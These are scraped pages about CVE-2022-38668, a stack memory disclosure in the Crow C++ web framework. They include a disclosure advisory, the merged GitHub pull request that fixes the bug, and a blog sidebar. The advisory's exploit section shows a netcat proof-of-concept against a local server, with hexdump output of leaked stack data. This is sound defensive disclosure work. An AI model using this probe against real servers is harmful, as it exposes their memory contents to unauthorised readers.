=== Content from github.com_d97855f6_20250108_133830.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2F0xhebi%2FCVEs%2Fblob%2Fmain%2FCrow%2FCVE-2022-38668.md)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2F0xhebi%2FCVEs%2Fblob%2Fmain%2FCrow%2FCVE-2022-38668.md)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=0xhebi%2FCVEs)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[0xhebi](/0xhebi)
/
**[CVEs](/0xhebi/CVEs)**
Public

* [Notifications](/login?return_to=%2F0xhebi%2FCVEs) You must be signed in to change notification settings
* [Fork
  2](/login?return_to=%2F0xhebi%2FCVEs)
* [Star
   2](/login?return_to=%2F0xhebi%2FCVEs)

* [Code](/0xhebi/CVEs)
* [Issues
  0](/0xhebi/CVEs/issues)
* [Pull requests
  0](/0xhebi/CVEs/pulls)
* [Actions](/0xhebi/CVEs/actions)
* [Projects
  0](/0xhebi/CVEs/projects)
* [Security](/0xhebi/CVEs/security)
* [Insights](/0xhebi/CVEs/pulse)

Additional navigation options

* [Code](/0xhebi/CVEs)
* [Issues](/0xhebi/CVEs/issues)
* [Pull requests](/0xhebi/CVEs/pulls)
* [Actions](/0xhebi/CVEs/actions)
* [Projects](/0xhebi/CVEs/projects)
* [Security](/0xhebi/CVEs/security)
* [Insights](/0xhebi/CVEs/pulse)

## Files

 main
## Breadcrumbs

1. [CVEs](/0xhebi/CVEs/tree/main)
2. /[Crow](/0xhebi/CVEs/tree/main/Crow)
/
# CVE-2022-38668.md

 Blame  Blame
## Latest commit

## History

[History](/0xhebi/CVEs/commits/main/Crow/CVE-2022-38668.md)134 lines (106 loc) · 6.73 KB main
## Breadcrumbs

1. [CVEs](/0xhebi/CVEs/tree/main)
2. /[Crow](/0xhebi/CVEs/tree/main/Crow)
/
# CVE-2022-38668.md

Top
## File metadata and controls

* Preview
* Code
* Blame

134 lines (106 loc) · 6.73 KB[Raw](https://github.com/0xhebi/CVEs/raw/refs/heads/main/Crow/CVE-2022-38668.md)
## ***Summary:***

Crow versions prior v1.0+4 (included) are vulnerable to an Information Disclosure
("Exposure of Sensitive Information to an Unauthorized Actor") issue, due to
improper handling of static resources.
Any request to a static resource, where the static resource is smaller than
16KB, will lead to disclosing up to 16KB of data from the stack.

Affected: Crow version 1.0+4 and older

<https://github.com/CrowCpp/Crow> - maintained version (fork)

<https://github.com/ipkn/crow> - original version

CVE ID: [CVE-2022-38668](https://www.cve.org/CVERecord?id=CVE-2022-38668)

CVSS: 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)

Discovered by:

 Gynvael Coldwind

 hebi

Method of discovery:

 Manual Analysis (reading the code)

> "Crow is a C++ framework for creating HTTP or Websocket web services. It uses
> routing similar to Python's Flask which makes it easy to use. It is also
> extremely fast, beating multiple existing C++ frameworks as well as non C++
> frameworks."

(source: project's README.md)

**IMPORTANT:** This vulnerability is reported under the 90-day policy
(version 2021), i.e. this report will be shared publicly with the defensive
community on 16th November 2022 if a patch/fix is not available by that time, or
30 days after the fix becomes available. For details please see:
<https://googleprojectzero.blogspot.com/2021/04/policy-and-disclosure-2021-edition.html>

## ***Vulnerability details***

The vulnerability is located in the `Connection::do_write_static`\* method within
the http\_connection.h file.
\*<https://github.com/CrowCpp/Crow/blob/master/include/crow/http_connection.h#L393>

This function creates a local buffer with a fixed size of 16384 bytes. Then the
buffer is passed to `is.read()` method (where "is" denotes an opened local file
pointed to by the static resource mapping) to acquire the content of the given
static resource (file). This call made within a while loop's condition, which
checks if any data was read (if not, the loop will exit).

However, the number of bytes that were read is not being tracked in any form.
Furthermore, the whole buffer is then passed to `asio::buffer` without specified
size\*\*.

**\*\*In this case it means that the whole array size will be used as data size, as
per the following constructor description:**

<https://www.boost.org/doc/libs/1_80_0/doc/html/boost_asio/reference/buffer/overload7.html>

This in turn leads to the whole local buffer being sent to the client requesting
the resource, including the potentially uninitialized part. This is especially
true for files smaller than 16KB.

**Conditions for triggering this behavior are:**

1. Static path needs to be defined.
2. At least 1 static file needs to exist
3. The file needs to be smaller than 16KB.

## ***Exploit***

```
$ cat poc.txt | nc -v 127.0.0.1 18080 | hexdump -C
localhost [127.0.0.1] 18080 (?) open
00000000  48 54 54 50 2f 31 2e 31  20 32 30 30 20 4f 4b 0d  |HTTP/1.1 200 OK.|
00000010  0a 43 6f 6e 74 65 6e 74  2d 54 79 70 65 3a 20 74  |.Content-Type: t|
00000020  65 78 74 2f 70 6c 61 69  6e 0d 0a 43 6f 6e 74 65  |ext/plain..Conte|
00000030  6e 74 2d 4c 65 6e 67 74  68 3a 20 35 0d 0a 53 65  |nt-Length: 5..Se|
00000040  72 76 65 72 3a 20 43 72  6f 77 2f 6d 61 73 74 65  |rver: Crow/maste|
00000050  72 0d 0a 44 61 74 65 3a  20 54 75 65 2c 20 31 36  |r..Date: Tue, 16|
00000060  20 41 75 67 20 32 30 32  32 20 32 32 3a 34 39 3a  | Aug 2022 22:49:|
00000070  32 32 20 47 4d 54 0d 0a  43 6f 6e 6e 65 63 74 69  |22 GMT..Connecti|
00000080  6f 6e 3a 20 4b 65 65 70  2d 41 6c 69 76 65 0d 0a  |on: Keep-Alive..|
00000090  0d 0a 54 65 73 74 0a 00  00 00 00 00 00 00 00 00  |..Test..........|
000000a0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
*
00002a90  00 00 00 00 00 00 00 00  00 00 28 14 00 ac d8 7f  |..........(.....|
00002aa0  00 00 20 14 00 ac d8 7f  00 00 48 f8 8c b4 d8 7f  |.. .......H.....|
00002ab0  00 00 50 f8 8c b4 d8 7f  00 00 49 8a 42 00 00 00  |..P.......I.B...|
00002ac0  00 00 28 14 00 ac d8 7f  00 00 20 14 00 ac d8 7f  |..(....... .....|
00002ad0  00 00 03 00 00 00 00 00  00 00 11 00 00 00 00 00  |................|
00002ae0  00 00 28 14 00 ac d8 7f  00 00 20 14 00 ac d8 7f  |..(....... .....|
00002af0  00 00 c0 f8 8c b4 d8 7f  00 00 cc 89 42 00 00 00  |............B...|
00002b00  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00002b10  00 00 5b 00 00 00 6e 00  00 00 c0 1c 00 ac d8 7f  |..[...n.........|
00002b20  00 00 b0 1c 00 ac d8 7f  00 00 01 00 00 00 00 00  |................|
00002b30  00 00 20 00 00 00 00 00  00 00 08 00 00 00 00 00  |.. .............|
00002b40  00 00 28 14 00 ac d8 7f  00 00 20 14 00 ac d8 7f  |..(....... .....|
00002b50  00 00 b0 1c 00 ac d8 7f  00 00 40 f9 8c b4 d8 7f  |..........@.....|
00002b60  00 00 f0 f8 8c b4 d8 7f  00 00 89 48 49 00 00 00  |...........HI...|
00002b70  00 00 28 3b 8d b4 d8 7f  00 00 30 14 00 ac d8 7f  |..(;......0.....|
00002b80  00 00 40 f9 8c b4 d8 7f  00 00 48 f9 8c b4 d8 7f  |..@.......H.....|
00002b90  00 00 50 f9 8c b4 d8 7f  00 00 99 47 49 00 00 00  |..P........GI...|
00002ba0  00 00 01 00 00 00 00 00  00 00 c8 04 8d b4 d8 7f  |................|
00002bb0  00 00 30 f9 8c b4 d8 7f  00 00 b0 1c 00 ac d8 7f  |..0.............|
00002bc0  00 00 01 00 00 00 00 00  00 00 c8 04 8d b4 d8 7f  |................|
00002bd0  00 00 d0 1c 00 ac d8 7f  00 00 b0 1c 00 ac d8 7f  |................|
00002be0  00 00 30 14 00 ac d8 7f  00 00 30 14 00 ac d8 7f  |..0.......0.....|
00002bf0  00 00 90 f9 8c b4 d8 7f  00 00 00 53 2a 66 e1 24  |...........S*f.$|
00002c00  09 b2 30 14 00 ac d8 7f  00 00 60 ff ff ff ff ff  |..0.......`.....|
...

```

## ***Proposed fix:***

Passing the actual size of bytes read to `asio::buffer`'s constructor.

### ***Timeline***

* 2022-08-14: Vulnerability discovered.
* 2022-08-17: Vulnerability reported.
* 2022-08-21: Public fix was proposed.
* 2022-08-22: Public fix was merged in.
* 2022-08-22: CVE requested and assigned.
* 2022-09-23: Details were published.

### ***Links***

**Gynvael's blog post:**

<https://gynvael.coldwind.pl/?lang=en&id=752>

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_dcd3787b_20250108_133831.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FCrowCpp%2FCrow%2Fpull%2F523)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FCrowCpp%2FCrow%2Fpull%2F523)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fpull_requests_fragments%2Fpull_request_layout&source=header-repo&source_repo=CrowCpp%2FCrow)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[CrowCpp](/CrowCpp)
/
**[Crow](/CrowCpp/Crow)**
Public

* [Notifications](/login?return_to=%2FCrowCpp%2FCrow) You must be signed in to change notification settings
* [Fork
  382](/login?return_to=%2FCrowCpp%2FCrow)
* [Star
   3.5k](/login?return_to=%2FCrowCpp%2FCrow)

* [Code](/CrowCpp/Crow)
* [Issues
  85](/CrowCpp/Crow/issues)
* [Pull requests
  19](/CrowCpp/Crow/pulls)
* [Actions](/CrowCpp/Crow/actions)
* [Security](/CrowCpp/Crow/security)
* [Insights](/CrowCpp/Crow/pulse)

Additional navigation options

* [Code](/CrowCpp/Crow)
* [Issues](/CrowCpp/Crow/issues)
* [Pull requests](/CrowCpp/Crow/pulls)
* [Actions](/CrowCpp/Crow/actions)
* [Security](/CrowCpp/Crow/security)
* [Insights](/CrowCpp/Crow/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2FCrowCpp%2FCrow%2Fissues%2Fnew%2Fchoose)

By clicking “Sign up for GitHub”, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We’ll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2FCrowCpp%2FCrow%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# Fix stack data disclosure when returning static files smaller than 16KiB #523

 Merged

[The-EDev](/The-EDev)
merged 2 commits into
[master](/CrowCpp/Crow/tree/master "CrowCpp/Crow:master")
from
[fix-stack-data-disclosure](/CrowCpp/Crow/tree/fix-stack-data-disclosure "CrowCpp/Crow:fix-stack-data-disclosure")

Aug 22, 2022

 Merged

# [Fix stack data disclosure when returning static files smaller than 16KiB](#top) #523

[The-EDev](/The-EDev)
merged 2 commits into
[master](/CrowCpp/Crow/tree/master "CrowCpp/Crow:master")
from
[fix-stack-data-disclosure](/CrowCpp/Crow/tree/fix-stack-data-disclosure "CrowCpp/Crow:fix-stack-data-disclosure")

Aug 22, 2022

[Conversation
7](/CrowCpp/Crow/pull/523)
[Commits
2](/CrowCpp/Crow/pull/523/commits)
[Checks
0](/CrowCpp/Crow/pull/523/checks)
[Files changed](/CrowCpp/Crow/pull/523/files)

## Conversation

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

[![mrozigor](https://avatars.githubusercontent.com/u/4171337?s=60&v=4)](/mrozigor)

Copy link

Member

### @mrozigor **[mrozigor](/mrozigor)** commented [Aug 21, 2022](#issue-1345503569) • edited Loading

It could also cause to return partially incorrect file ending in

case of file not being rounded up to 16KiB.

Thanks to Gynvael Coldwind and hebi for discovering and preparing

report.

Sorry, something went wrong.

All reactions

 [![@mrozigor](https://avatars.githubusercontent.com/u/4171337?s=40&u=a16f37b5044ed872cfd93bba1eb4662e1b185312&v=4)](/mrozigor)
[mrozigor](/mrozigor)
requested review from
[The-EDev](/The-EDev) and
[luca-schlecker](/luca-schlecker)
[August 21, 2022 14:30](#event-7227782986)

[![@luca-schlecker](https://avatars.githubusercontent.com/u/66110953?s=80&u=817258b978c4bf5443d97cee987a597294a72bb3&v=4)](/luca-schlecker)

Copy link

Collaborator

### **[luca-schlecker](/luca-schlecker)** commented [Aug 21, 2022](#issuecomment-1221589816)

| Is there a reason that the `buffers` vector is inside the loop? |
| --- |

 👍
2
 MichaelSB and The-EDev reacted with thumbs up emoji

All reactions

* 👍
  2 reactions

Sorry, something went wrong.

[![@mrozigor](https://avatars.githubusercontent.com/u/4171337?s=80&u=a16f37b5044ed872cfd93bba1eb4662e1b185312&v=4)](/mrozigor)

Copy link

Member

Author

### **[mrozigor](/mrozigor)** commented [Aug 22, 2022](#issuecomment-1222219231)

| It was already implemented like this. It looks like `asio::write` expects vector of buffers. Also it looks like `asio::buffer` doesn't own memory (<https://think-async.com/Asio/asio-1.22.1/doc/asio/reference/buffer.html#asio.reference.buffer.buffer_invalidation>), so we have to:   * send it buffers vector immediately with only one buffer and then use existing array to load next part of a file (current solution) * copy memory from array (or maybe load data directly to `asio::buffer`) with use of (I guess) `asio::buffer_copy` (<https://think-async.com/Asio/asio-1.22.1/doc/asio/reference/buffer_copy.html>) |
| --- |

All reactions

Sorry, something went wrong.

[![luca-schlecker](https://avatars.githubusercontent.com/u/66110953?s=60&v=4)](/luca-schlecker)

**[luca-schlecker](/luca-schlecker)**
previously approved these changes
[Aug 22, 2022](#pullrequestreview-1080317827)

 [View reviewed changes](/CrowCpp/Crow/pull/523/files)

Copy link

Collaborator

### @luca-schlecker **[luca-schlecker](/luca-schlecker)** left a comment

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

I see, the current solution works fine, no need to add extra copy-operations.

LGTM 👍

Sorry, something went wrong.

 👍
1
 mrozigor reacted with thumbs up emoji

All reactions

* 👍
  1 reaction

[![@mrozigor](https://avatars.githubusercontent.com/u/4171337?s=80&u=a16f37b5044ed872cfd93bba1eb4662e1b185312&v=4)](/mrozigor)

Copy link

Member

Author

### **[mrozigor](/mrozigor)** commented [Aug 22, 2022](#issuecomment-1222242421)

| I'll leave it till tomorrow and then merge. Thanks! |
| --- |

All reactions

Sorry, something went wrong.

[![@MichaelSB](https://avatars.githubusercontent.com/u/1029770?s=80&u=c35fa5f2b2421e5752b0ca6456dddeb261e5e9d0&v=4)](/MichaelSB)

Copy link

Contributor

### **[MichaelSB](/MichaelSB)** commented [Aug 22, 2022](#issuecomment-1222703026)

| The vector with size 1 could be constructed outside the loop. And then the asio::buffer would be assigned to the first element in the vector inside the loop. Imo. No copy needed and we would save construction/destruction of a vector in a loop (probably alloc/dealloc) |
| --- |

 👍
1
 mrozigor reacted with thumbs up emoji

All reactions

* 👍
  1 reaction

Sorry, something went wrong.

[![@mrozigor](https://avatars.githubusercontent.com/u/4171337?s=80&u=a16f37b5044ed872cfd93bba1eb4662e1b185312&v=4)](/mrozigor)

Copy link

Member

Author

### **[mrozigor](/mrozigor)** commented [Aug 22, 2022](#issuecomment-1222735919)

| Good point. I didn't want to change anything not connected directly with error, but maybe postponing it is a worse idea :P |
| --- |

All reactions

Sorry, something went wrong.

 [![@mrozigor](https://avatars.githubusercontent.com/u/4171337?s=40&u=a16f37b5044ed872cfd93bba1eb4662e1b185312&v=4)](/mrozigor)
[mrozigor](/mrozigor)
dismissed
[luca-schlecker](/luca-schlecker)’s [stale review](#pullrequestreview-1080317827)
via
`[ca898ed](/CrowCpp/Crow/commit/ca898ed0cf7909fb44b143207e145d566b11401e)`
[August 22, 2022 18:08](#event-7235159637)

 [![@mrozigor](https://avatars.githubusercontent.com/u/4171337?s=40&u=a16f37b5044ed872cfd93bba1eb4662e1b185312&v=4)](/mrozigor)
[mrozigor](/mrozigor)
[force-pushed](/CrowCpp/Crow/compare/f553c8656263780b01f05fe820e233efaeb61a8f..ca898ed0cf7909fb44b143207e145d566b11401e)
the
fix-stack-data-disclosure

branch
from
[`f553c86`](/CrowCpp/Crow/commit/f553c8656263780b01f05fe820e233efaeb61a8f) to
[`ca898ed`](/CrowCpp/Crow/commit/ca898ed0cf7909fb44b143207e145d566b11401e)  [Compare](/CrowCpp/Crow/compare/f553c8656263780b01f05fe820e233efaeb61a8f..ca898ed0cf7909fb44b143207e145d566b11401e)
[August 22, 2022 18:08](#event-7235159645)

[![@crow-clang-format](https://avatars.githubusercontent.com/in/150522?s=80&v=4)](/apps/crow-clang-format)

Copy link

### **[crow-clang-format](/apps/crow-clang-format) bot** commented [Aug 22, 2022](#issuecomment-1222741640)

| ``` --- include/crow/http_connection.h	(before formatting) +++ include/crow/http_connection.h	(after formatting) @@ -389,7 +389,7 @@              if (res.file_info.statResult == 0)              {                  std::ifstream is(res.file_info.path.c_str(), std::ios::in | std::ios::binary); -                std::vector<asio::const_buffer> buffers {1}; +                std::vector<asio::const_buffer> buffers{1};                  char buf[16384];                  is.read(buf, sizeof(buf));                  while (is.gcount() > 0) ``` |
| --- |

All reactions

Sorry, something went wrong.

[![@mrozigor](https://avatars.githubusercontent.com/u/4171337?s=40&v=4)](/mrozigor)

`[Fix stack data disclosure when returning static files smaller than](/CrowCpp/Crow/pull/523/commits/d17a88af696b9de62504adf2a4657d381733b9e2 "Fix stack data disclosure when returning static files smaller than
16KiB. It could also cause to return partially incorrect file ending in
case of file not being rounded up to 16KiB.

Thanks to Gynvael Coldwind and hebi for discovering and preparing
report.")`
 …

`[d17a88a](/CrowCpp/Crow/pull/523/commits/d17a88af696b9de62504adf2a4657d381733b9e2)`

```
16KiB. It could also cause to return partially incorrect file ending in
case of file not being rounded up to 16KiB.

Thanks to Gynvael Coldwind and hebi for discovering and preparing
report.
```

 [![@mrozigor](https://avatars.githubusercontent.com/u/4171337?s=40&u=a16f37b5044ed872cfd93bba1eb4662e1b185312&v=4)](/mrozigor)
[mrozigor](/mrozigor)
[force-pushed](/CrowCpp/Crow/compare/ca898ed0cf7909fb44b143207e145d566b11401e..d17a88af696b9de62504adf2a4657d381733b9e2)
the
fix-stack-data-disclosure

branch
from
[`ca898ed`](/CrowCpp/Crow/commit/ca898ed0cf7909fb44b143207e145d566b11401e) to
[`d17a88a`](/CrowCpp/Crow/commit/d17a88af696b9de62504adf2a4657d381733b9e2)  [Compare](/CrowCpp/Crow/compare/ca898ed0cf7909fb44b143207e145d566b11401e..d17a88af696b9de62504adf2a4657d381733b9e2)
[August 22, 2022 18:15](#event-7235212357)

[![The-EDev](https://avatars.githubusercontent.com/u/60552923?s=60&v=4)](/The-EDev)

**[The-EDev](/The-EDev)**
approved these changes
[Aug 22, 2022](#pullrequestreview-1081029802)

 [View reviewed changes](/CrowCpp/Crow/pull/523/files/d17a88af696b9de62504adf2a4657d381733b9e2)

[![@The-EDev](https://avatars.githubusercontent.com/u/60552923?s=40&v=4)](/The-EDev)

`[Merge branch 'master' into fix-stack-data-disclosure](/CrowCpp/Crow/pull/523/commits/27439944b096f527d49bd07c3cd0edfbda21d175 "Merge branch 'master' into fix-stack-data-disclosure")`

`[2743994](/CrowCpp/Crow/pull/523/commits/27439944b096f527d49bd07c3cd0edfbda21d175)`

[![@The-EDev](https://avatars.githubusercontent.com/u/60552923?s=40&u=fe0071d43c01c4f7a6fc659f122e093ea8b19549&v=4)](/The-EDev)
[The-EDev](/The-EDev)
merged commit [`c0bfaa7`](/CrowCpp/Crow/commit/c0bfaa7709fe9698c0989788ddee6c2cdf254043)
into
master

[Aug 22, 2022](https://github.com/CrowCpp/Crow/pull/523#event-7236391624)

 [![@gittiver](https://avatars.githubusercontent.com/u/142663?s=40&v=4)](/gittiver)
[gittiver](/gittiver)
deleted the
fix-stack-data-disclosure

branch
[July 26, 2024 08:28](#event-13657996391)

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2FCrowCpp%2FCrow%2Fpull%2F523)

Reviewers

[![@The-EDev](https://avatars.githubusercontent.com/u/60552923?s=40&v=4)](/The-EDev) [The-EDev](/The-EDev)

The-EDev approved these changes

[![@luca-schlecker](https://avatars.githubusercontent.com/u/66110953?s=40&v=4)](/luca-schlecker) [luca-schlecker](/luca-schlecker)

luca-schlecker left review comments

Assignees

No one assigned

Labels

None yet

Projects

None yet

Milestone

No milestone

Development

Successfully merging this pull request may close these issues.

4 participants

[![@mrozigor](https://avatars.githubusercontent.com/u/4171337?s=52&v=4)](/mrozigor) [![@luca-schlecker](https://avatars.githubusercontent.com/u/66110953?s=52&v=4)](/luca-schlecker) [![@MichaelSB](https://avatars.githubusercontent.com/u/1029770?s=52&v=4)](/MichaelSB) [![@The-EDev](https://avatars.githubusercontent.com/u/60552923?s=52&v=4)](/The-EDev)

Add this suggestion to a batch that can be applied as a single commit.
This suggestion is invalid because no changes were made to the code.
Suggestions cannot be applied while the pull request is closed.
Suggestions cannot be applied while viewing a subset of changes.
Only one suggestion per line can be applied in a batch.
Add this suggestion to a batch that can be applied as a single commit.
Applying suggestions on deleted lines is not supported.
You must change the existing code in this line in order to create a valid suggestion.
Outdated suggestions cannot be applied.
This suggestion has been applied or marked resolved.
Suggestions cannot be applied from pending reviews.
Suggestions cannot be applied on multi-line comments.
Suggestions cannot be applied while the pull request is queued to merge.
Suggestion cannot be applied right now. Please check back later.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from gynvael.coldwind.pl_1d4d041d_20250108_133831.html ===

# [gynvael.coldwin//vx.log](/?blog=1)

![](/images/something_suspicious.png)
[Available for Consulting and Projects](https://hexarcana.ch/?utm=gyn-blog)
[Upcoming Talks](https://hexarcana.ch/workshops/?utm=gyn-blog-w)

![](/img/gynvael-close.jpg)

* [Return to dashboard ⇪](/)

### *Sections*

* **lang**: [![PL](/images/lang_pl.png)](?blog=1&lang=pl) | [![EN](/images/lang_en.png)](?blog=1&lang=en)
* **RSS**: [![RSS PL](/images/lang_pl.png)](/rss_pl.php) | [![RSS EN](/images/lang_en.png)](/rss_en.php)
* [About me](?id=50)
* [Tools](?id=182)
* [→ YT YouTube (EN)](https://youtube.com/c/GynvaelEN)
* [→ D Discord](/discord)* [→ M Mastodon](https://infosec.exchange/%40gynvael)* [→ T Twitter](https://twitter.com/gynvael)* [→ GH GitHub](https://github.com/gynvael)

        [![](/img/hexarcana160_2.png)](https://hexarcana.ch)

        [My company's website](https://hexarcana.ch)

        [![](/img/po_issue_5_rbanner.png)](https://pagedout.institute/)

        [Paged Out! zine](https://pagedout.institute/)

        [![](/img/ds_logo_160.jpg)](https://dragonsector.pl/)

        [Dragon Sector CTF Team](https://dragonsector.pl/)

### *Links / Blogs*

* [→ dragonsector.pl](http://dragonsector.pl)
* [→ vexillium.org](http://vexillium.org)
* **Security/Hacking:**
  + [j00ru's blog](http://j00ru.vexillium.org/?lang=en)
  + [lcamtuf's blog](http://lcamtuf.blogspot.com/)
  + [invisible things (new)](http://blog.invisiblethings.org/)
